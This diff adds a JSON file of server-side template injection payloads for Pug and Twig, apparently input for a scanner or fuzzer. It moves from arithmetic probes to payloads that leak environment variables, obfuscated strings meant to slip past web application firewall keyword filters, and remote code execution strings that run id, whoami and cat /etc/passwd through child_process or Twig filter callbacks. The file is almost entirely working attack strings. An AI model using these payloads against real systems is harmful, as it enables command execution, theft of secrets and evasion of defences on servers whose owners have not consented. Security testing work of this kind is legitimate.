@@ -1,0 +1,187 @@
+{
+    "payload_families": {
+        "arithmetic_probe": {
+            "description": "Arithmetic expressions to confirm Pug template evaluation",
+            "payloads": [
+                "#{7*7}",
+                "#{3+3}",
+                "#{Math.pow(2,10)}",
+                "#{1337*1337}",
+                "#{2*21}",
+                "#{9*9}",
+                "#{typeof global}",
+                "#{Array.isArray([])}",
+                "#{Math.PI}"
+            ]
+        },
+        "string_ops": {
+            "description": "JavaScript string operations evaluated by Pug",
+            "payloads": [
+                "#{'hello'.toUpperCase()}",
+                "#{'abc'.repeat(3)}",
+                "#{'SSTI'.toLowerCase()}",
+                "#{'hello world'.split(' ').join('_')}",
+                "#{'juice'.concat('shop')}",
+                "#{'test'.replace('t','T')}",
+                "#{[1,2,3].join('-')}",
+                "#{'abcdef'.substring(0,3)}",
+                "#{typeof 'string'}"
+            ]
+        },
+        "global_object": {
+            "description": "Access global Node.js objects and properties to leak version / platform",
+            "payloads": [
+                "#{global.process.version}",
+                "#{global.process.platform}",
+                "#{global.process.pid}",
+                "#{global.process.cwd()}",
+                "#{global.process.title}",
+                "#{global.process.arch}",
+                "#{global.Object.keys(global).length}",
+                "#{global.process.versions.node}",
+                "#{global.process.uptime()}"
+            ]
+        },
+        "env_access": {
+            "description": "Environment variable exfiltration via process.env",
+            "payloads": [
+                "#{process.env.PATH}",
+                "#{process.env.NODE_ENV}",
+                "#{process.env.HOME}",
+                "#{process.env.USER}",
+                "#{process.env.PWD}",
+                "#{Object.keys(process.env).join(',')}",
+                "#{process.env.HOSTNAME}",
+                "#{process.env.SHELL}",
+                "#{process.env.LANG}"
+            ]
+        },
+        "waf_bypass_encoding": {
+            "description": "Hex-encoded or obfuscated payloads to bypass WAF keyword filters",
+            "payloads": [
+                "#{global['\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'].version}",
+                "#{global['pro'+'cess'].version}",
+                "#{global[String.fromCharCode(112,114,111,99,101,115,115)].version}",
+                "#{global[Buffer.from('cHJvY2Vzcw==','base64').toString()].version}",
+                "#{(''+'').constructor.constructor('return 1+1')()}",
+                "#{(function(){return typeof global['pro'+'cess']})()}",
+                "#{global['pro'+'cess']['ver'+'sion']}",
+                "#{global[atob('cHJvY2Vzcw==')]}"
+            ]
+        },
+        "waf_bypass_concat": {
+            "description": "Concatenation and array join tricks to reconstruct blocked strings",
+            "payloads": [
+                "#{['pro','cess'].join('')}",
+                "#{['chil','d_pro','cess'].join('')}",
+                "#{global[['pro','cess'].join('')].version}",
+                "#{global[['pro','cess'].join('')]['ver'+'sion']}",
+                "#{global[`proc${'ess'}`].version}",
+                "#{(function(x){return global[x].version})(['pro','cess'].join(''))}",
+                "#{global[['pro','cess'].join('')].env.PATH}",
+                "#{global[['pro','cess'].join('')].platform}"
+            ]
+        },
+        "rce_direct": {
+            "description": "Direct child_process RCE via require (may be WAF-blocked)",
+            "payloads": [
+                "#{require('child_process').execSync('id').toString()}",
+                "#{require('child_process').execSync('whoami').toString()}",
+                "#{require('child_process').execSync('cat /etc/passwd').toString()}",
+                "#{require('child_process').execSync('ls /').toString()}",
+                "#{require('child_process').execSync('hostname').toString()}",
+                "#{require('child_process').execSync('uname -a').toString()}",
+                "#{require('child_process').spawnSync('id').stdout.toString()}",
+                "#{require('child_process').execFileSync('/usr/bin/id').toString()}"
+            ]
+        },
+        "rce_indirect": {
+            "description": "Indirect RCE via mainModule chain to bypass require restrictions",
+            "payloads": [
+                "#{global.process.mainModule.require('child_process').execSync('id').toString()}",
+                "#{global.process.mainModule.require('child_process').execSync('whoami').toString()}",
+                "#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}",
+                "#{global[['pro','cess'].join('')].mainModule.require('child_process').execSync('id').toString()}",
+                "#{global.process.mainModule.require('child_process').execFileSync('/usr/bin/id').toString()}",
+                "#{global.process.mainModule.require('child_process').execSync('ls /').toString()}",
+                "#{global.process.mainModule.require('child_process').execSync('hostname').toString()}",
+                "#{global.process.mainModule.require('child_process').execSync('uname -a').toString()}"
+            ]
+        },
+
+        "twig_arithmetic": {
+            "description": "Arithmetic expressions to confirm Twig template evaluation (PHP)",
+            "payloads": [
+                "{{7*7}}",
+                "{{2**8}}",
+                "{{7*'7'}}",
+                "{{9*9}}",
+                "{{1+1}}",
+                "{{3**3}}",
+                "{{100/4}}"
+            ]
+        },
+        "twig_string_ops": {
+            "description": "Twig string/filter operations to confirm template evaluation",
+            "payloads": [
+                "{{'hello'|upper}}",
+                "{{'hello'|reverse}}",
+                "{{'hello world'|title}}",
+                "{{'HELLO'|lower}}",
+                "{{range(1,5)|join(',')}}",
+                "{{'abc'~'def'}}",
+                "{{'hello'|length}}"
+            ]
+        },
+        "twig_object_dump": {
+            "description": "Dump Twig internal objects to probe execution context",
+            "payloads": [
+                "{{_self}}",
+                "{{app}}",
+                "{{dump(app)}}",
+                "{{_self.getEnvironment()}}",
+                "{{app.request}}"
+            ]
+        },
+        "twig_env_access": {
+            "description": "Access request/environment info via Twig app/request objects",
+            "payloads": [
+                "{{app.request.server.all|join(',')}}",
+                "{{app.request.headers.all|join(',')}}",
+                "{{app.request.server.get('PHP_SELF')}}",
+                "{{app.request.server.get('SERVER_SOFTWARE')}}",
+                "{{app.request.server.get('DOCUMENT_ROOT')}}"
+            ]
+        },
+        "twig_waf_bypass": {
+            "description": "WAF bypass techniques for Twig sandbox environments",
+            "payloads": [
+                "{{7 * 7}}",
+                "{{'hel'~'lo'|upper}}",
+                "{{{'a':1}|keys|first}}",
+                "{{[1,2,3]|last}}",
+                "{{'hello'|slice(0,3)|upper}}"
+            ]
+        },
+        "twig_filter_chain": {
+            "description": "Twig filter callback chains for RCE via registerUndefinedFilterCallback",
+            "payloads": [
+                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}",
+                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('whoami')}}",
+                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}}"
+            ]
+        },
+        "twig_rce": {
+            "description": "Direct RCE via Twig map/filter with system/passthru callbacks",
+            "payloads": [
+                "{{['id']|filter('system')|join}}",
+                "{{['whoami']|filter('system')|join}}",
+                "{{['cat /etc/passwd']|filter('system')|join}}",
+                "{{['id']|map('system')|join}}",
+                "{{['ls /']|filter('passthru')|join}}"
+            ]
+        }
+    }
+}
